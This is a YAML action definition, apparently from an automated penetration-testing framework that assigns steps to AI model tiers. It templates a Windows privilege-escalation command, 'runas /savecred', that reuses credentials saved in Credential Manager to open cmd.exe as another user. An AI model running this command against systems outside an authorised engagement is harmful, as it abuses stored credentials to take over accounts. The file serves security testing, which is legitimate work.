name: runas_savecred
category: privesc
description: Windows RunAs with saved credentials
preconditions:
  - os==windows
parameters:
  target_ip: from_engagement.target_ip
command_template: "runas /savecred /user:{domain}\{username} cmd.exe"
parser: null
expected_effects:
  - action_completed
falsifier:
  pattern: "error|failed|refused|denied"
  timeout: 30
model_tier: haiku
mechanism: "If credentials are saved in Credential Manager (cmdkey /list shows entries), runas /savecred uses them without password prompt. Common for service accounts."
